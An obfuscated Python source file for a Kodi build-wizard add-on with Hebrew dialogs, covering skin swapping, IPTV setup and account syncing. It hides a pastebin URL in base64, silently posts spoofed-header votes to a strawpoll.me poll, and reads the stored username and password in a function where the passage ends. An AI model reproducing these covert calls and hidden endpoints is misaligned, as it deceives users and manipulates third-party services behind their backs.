# -*- coding: utf-8 -*-
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
DP2 =xbmcgui .DialogProgressBG ()#line:67
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O0OO0000000OOO00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	O00O0OO000OO0O0O0 =[];OO0O0O00000O0000O =[]#line:267
	for O0OO0O000OO0O0000 in sorted (O0OO0000000OOO00O ,key =lambda O00O00O0O0OOO00OO :O00O00O0O0OOO00OO ):#line:268
		O0O0O0000O00OO000 =os .path .split (O0OO0O000OO0O0000 [:-1 ])[1 ]#line:269
		O00OOOO0OOO00OO0O =os .path .join (O0OO0O000OO0O0000 ,'addon.xml')#line:270
		if os .path .exists (O00OOOO0OOO00OO0O ):#line:271
			OOOOOO000OO0O0OO0 =open (O00OOOO0OOO00OO0O )#line:272
			O0OO000O0O000OOO0 =OOOOOO000OO0O0OO0 .read ()#line:273
			OOO00OOOOOO0OO0OO =parseDOM2 (O0OO000O0O000OOO0 ,'addon',ret ='id')#line:274
			O000000O0O00O000O =O0O0O0000O00OO000 if len (OOO00OOOOOO0OO0OO )==0 else OOO00OOOOOO0OO0OO [0 ]#line:275
			try :#line:276
				O0O000000O000O0OO =xbmcaddon .Addon (id =O000000O0O00O000O )#line:277
				O00O0OO000OO0O0O0 .append (O0O000000O000O0OO .getAddonInfo ('name'))#line:278
				OO0O0O00000O0000O .append (O000000O0O00O000O )#line:279
			except :#line:280
				pass #line:281
	OO00OO00OO0O0000O =[];OOO0O00O0O0000O0O =0 #line:282
	O000O0OOO000000OO =["Current Skin -- %s"%currSkin ()]+O00O0OO000OO0O0O0 #line:283
	OOO0O00O0O0000O0O =DIALOG .select ("Select the Skin you want to swap with.",O000O0OOO000000OO )#line:284
	if OOO0O00O0O0000O0O ==-1 :return #line:285
	else :#line:286
		O00O0O0O00OOOO000 =(OOO0O00O0O0000O0O -1 )#line:287
		OO00OO00OO0O0000O .append (O00O0O0O00OOOO000 )#line:288
		O000O0OOO000000OO [OOO0O00O0O0000O0O ]="%s"%(O00O0OO000OO0O0O0 [O00O0O0O00OOOO000 ])#line:289
	if OO00OO00OO0O0000O ==None :return #line:290
	for OOOOO0000O0O000O0 in OO00OO00OO0O0000O :#line:291
		swapSkins (OO0O0O00000O0000O [OOOOO0000O0O000O0 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (OO00000O00OOO000O ,title ="Error"):#line:296
	OO00OOO00O0000OOO ='lookandfeel.skin'#line:297
	OO00000OO0OOO00OO =OO00000O00OOO000O #line:298
	O0OO0000O0OOOO000 =getOld (OO00OOO00O0000OOO )#line:299
	O0O00O0O0O0O0000O =OO00OOO00O0000OOO #line:300
	setNew (O0O00O0O0O0O0000O ,OO00000OO0OOO00OO )#line:301
	OO0OO000OOOO0OO00 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO000OOOO0OO00 <100 :#line:303
		OO0OO000OOOO0OO00 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0O0000OOO00000OO ):#line:310
	try :#line:311
		O0O0000OOO00000OO ='"%s"'%O0O0000OOO00000OO #line:312
		O00OOO0OOO00OO000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O0000OOO00000OO )#line:313
		O00OOO00O0OOOOO00 =xbmc .executeJSONRPC (O00OOO0OOO00OO000 )#line:315
		O00OOO00O0OOOOO00 =simplejson .loads (O00OOO00O0OOOOO00 )#line:316
		if O00OOO00O0OOOOO00 .has_key ('result'):#line:317
			if O00OOO00O0OOOOO00 ['result'].has_key ('value'):#line:318
				return O00OOO00O0OOOOO00 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O000OO00OOO0OOO0O ,OO00O0OO000OO0OOO ):#line:325
	try :#line:326
		O000OO00OOO0OOO0O ='"%s"'%O000OO00OOO0OOO0O #line:327
		OO00O0OO000OO0OOO ='"%s"'%OO00O0OO000OO0OOO #line:328
		OOO0OO00OOOOOO0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O000OO00OOO0OOO0O ,OO00O0OO000OO0OOO )#line:329
		OOOO0OOO0O0O00OOO =xbmc .executeJSONRPC (OOO0OO00OOOOOO0OO )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OOO0O0OOOO0O0OOO0 =xbmcgui .DialogProgress ()#line:340
			OOO0O0OOOO0O0OOO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OOO0O0OOOO0O0OOO0 .update (0 )#line:344
			for OO00O0OO00OO0O0O0 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OOO0O0OOOO0O0OOO0 .update (int ((5 -OO00O0OO00OO0O0O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO00O0OO00OO0O0O0 ),'')#line:347
				if OOO0O0OOOO0O0OOO0 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OOO0O0OOOO0O0OOO0 =xbmcgui .DialogProgress ()#line:353
			OOO0O0OOOO0O0OOO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OOO0O0OOOO0O0OOO0 .update (0 )#line:357
			for OO00O0OO00OO0O0O0 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OOO0O0OOOO0O0OOO0 .update (int ((5 -OO00O0OO00OO0O0O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00O0OO00OO0O0O0 ),'')#line:360
				if OOO0O0OOOO0O0OOO0 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    OOO0OO0O00OO0OO00 ='18773068'#line:373
    OO0O00O0O0O000O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0OO0O00OO0OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    OO0O0OO0OO0000OO0 ='145273320'#line:387
    OOOO0000000000000 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        OO0O0OOOOO0OO00OO =OO0O0OO0OO0000OO0 #line:390
    else :#line:391
        OO0O0OOOOO0OO00OO =OOOO0000000000000 #line:392
    OOO0OO0O0O0O000OO ={'options':OO0O0OOOOO0OO00OO }#line:396
    O00O0OOOOO0O00OOO =requests .post ('https://www.strawpoll.me/'+OOO0OO0O00OO0OO00 ,headers =OO0O00O0O0O000O00 ,data =OOO0OO0O0O0O000OO )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0OOOO0O0000O000O ='18773068'#line:402
        OO00OOOO0O0OOOOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOOO0O0000O000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O00O0OOOO0O0000O0 ='145273320'#line:416
        OO0OOO000OO000000 ={'options':O00O0OOOO0O0000O0 }#line:422
        OO00O0O0OOOO0O000 =requests .post ('https://www.strawpoll.me/'+O0OOOO0O0000O000O ,headers =OO00OOOO0O0OOOOOO ,data =OO0OOO000OO000000 )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        OOO0O00O00OO0OOO0 ='18773068'#line:429
        OO0OOO00O0OO0000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0O00O00OO0OOO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OOOOO0OO000O0O0O0 ='145273321'#line:443
        OO0OOOOO0OO0OO00O ={'options':OOOOO0OO000O0O0O0 }#line:449
        OOOOOO00O0OO0O0OO =requests .post ('https://www.strawpoll.me/'+OOO0O00O00OO0OOO0 ,headers =OO0OOO00O0OO0000O ,data =OO0OOOOO0OO0OO00O )#line:451
   except :pass #line:452
def testcommand ():#line:456
 OOOO0OO0OO000OO0O =os .path .dirname (os .path .realpath (__file__ ))#line:457
 O00OOOO0O00OOO0O0 =os .path .join (OOOO0OO0OO000OO0O ,'changelog.txt')#line:458
 O0000O0OO0OOO00OO =open (O00OOOO0O00OOO0O0 ,'r')#line:459
 O00O00O00OOOO0OO0 =O0000O0OO0OOO00OO .read ()#line:460
 OO0O00OOOOO000OO0 =O00O00O00OOOO0OO0 #line:461
 notify .updateinfo (OO0O00OOOOO000OO0 ,True )#line:462
def skin_homeselect ():#line:463
	try :#line:465
		O0OO0OO00OOOOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:466
		OOOO0O000000O00O0 =open (O0OO0OO00OOOOOOO0 ,'r')#line:468
		OO0OO00OO0O0O0OO0 =OOOO0O000000O00O0 .read ()#line:469
		OOOO0O000000O00O0 .close ()#line:470
		O00OOOO0O0O000O0O ='<setting id="HomeS" type="string(.+?)/setting>'#line:471
		O0O0000OOOO0O000O =re .compile (O00OOOO0O0O000O0O ).findall (OO0OO00OO0O0O0OO0 )[0 ]#line:472
		OOOO0O000000O00O0 =open (O0OO0OO00OOOOOOO0 ,'w')#line:473
		OOOO0O000000O00O0 .write (OO0OO00OO0O0O0OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O0O0000OOOO0O000O ,'<setting id="HomeS" type="string"></setting>'))#line:474
		OOOO0O000000O00O0 .close ()#line:475
	except :#line:476
		pass #line:477
def autotrakt ():#line:480
    O0OOO0OO0OOOO000O =(ADDON .getSetting ("auto_trk"))#line:481
    if O0OOO0OO0OOOO000O =='true':#line:482
       from resources .libs import trk_aut #line:483
def traktsync ():#line:485
     O0OO00OO0O0O0O0OO =(ADDON .getSetting ("auto_trk"))#line:486
     if O0OO00OO0O0O0O0OO =='true':#line:487
       from resources .libs import trk_aut #line:490
     else :#line:491
        ADDON .openSettings ()#line:492
def imdb_synck ():#line:494
   try :#line:495
     OO0OOO00OO0OO000O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:496
     OOOOO000O0O000O0O =xbmcaddon .Addon ('plugin.video.gaia')#line:497
     O000000O000O0O0OO =(ADDON .getSetting ("imdb_sync"))#line:498
     O00000O000O00O00O ="imdb.user"#line:499
     O0O0O0OOO00OO0000 ="accounts.informants.imdb.user"#line:500
     OO0OOO00OO0OO000O .setSetting (O00000O000O00O00O ,str (O000000O000O0O0OO ))#line:501
     OOOOO000O0O000O0O .setSetting ('accounts.informants.imdb.enabled','true')#line:502
     OOOOO000O0O000O0O .setSetting (O0O0O0OOO00OO0000 ,str (O000000O000O0O0OO ))#line:503
   except :pass #line:504
def dis_or_enable_addon (OOOO00O0OO0O0OO00 ,OO00O0000O0O00OO0 ,enable ="true"):#line:506
    import json #line:507
    OO00OOO0000O0O000 ='"%s"'%OOOO00O0OO0O0OO00 #line:508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO00O0OO0O0OO00 )and enable =="true":#line:509
        logging .warning ('already Enabled')#line:510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO00O0OO0O0OO00 )#line:511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO00O0OO0O0OO00 )and enable =="false":#line:512
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO00O0OO0O0OO00 )#line:513
    else :#line:514
        O00OO0OO0O000OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00OOO0000O0O000 ,enable )#line:515
        OOOOO0O00OO0000OO =xbmc .executeJSONRPC (O00OO0OO0O000OO00 )#line:516
        O0000OOOOO00OO0OO =json .loads (OOOOO0O00OO0000OO )#line:517
        if enable =="true":#line:518
            xbmc .log ("### Enabled %s, response = %s"%(OOOO00O0OO0O0OO00 ,O0000OOOOO00OO0OO ))#line:519
        else :#line:520
            xbmc .log ("### Disabled %s, response = %s"%(OOOO00O0OO0O0OO00 ,O0000OOOOO00OO0OO ))#line:521
    if OO00O0000O0O00OO0 =='auto':#line:522
     return True #line:523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:524
def iptvset ():#line:527
  try :#line:528
    O00O0OOOO000O0O0O =(ADDON .getSetting ("iptv_on"))#line:529
    if O00O0OOOO000O0O0O =='true':#line:531
       if KODIV >=17 and KODIV <18 :#line:533
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:534
         O00OO0O000O0O000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:535
         O0OOO00O00O000O0O =(ADDON .getSetting ("iptvUrl"))#line:537
         O00OO0O000O0O000O .setSetting ('m3uUrl',O0OOO00O00O000O0O )#line:538
         O0OOOOO0O0O0OO00O =(ADDON .getSetting ("epg_Url"))#line:539
         O00OO0O000O0O000O .setSetting ('epgUrl',O0OOOOO0O0O0OO00O )#line:540
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:543
         iptvsimpldownpc ()#line:544
         wiz .kodi17Fix ()#line:545
         xbmc .sleep (1000 )#line:546
         O00OO0O000O0O000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:547
         O0OOO00O00O000O0O =(ADDON .getSetting ("iptvUrl"))#line:548
         O00OO0O000O0O000O .setSetting ('m3uUrl',O0OOO00O00O000O0O )#line:549
         O0OOOOO0O0O0OO00O =(ADDON .getSetting ("epg_Url"))#line:550
         O00OO0O000O0O000O .setSetting ('epgUrl',O0OOOOO0O0O0OO00O )#line:551
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:553
         iptvsimpldown ()#line:554
         wiz .kodi17Fix ()#line:555
         xbmc .sleep (1000 )#line:556
         O00OO0O000O0O000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:557
         O0OOO00O00O000O0O =(ADDON .getSetting ("iptvUrl"))#line:558
         O00OO0O000O0O000O .setSetting ('m3uUrl',O0OOO00O00O000O0O )#line:559
         O0OOOOO0O0O0OO00O =(ADDON .getSetting ("epg_Url"))#line:560
         O00OO0O000O0O000O .setSetting ('epgUrl',O0OOOOO0O0O0OO00O )#line:561
  except :pass #line:562
def howsentlog ():#line:569
       try :#line:570
          import json #line:571
          O0OOO000OO0O0O0OO =(ADDON .getSetting ("user"))#line:572
          O0OO0000O000O00OO =(ADDON .getSetting ("pass"))#line:573
          OO0OO00OOO0OOO0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:574
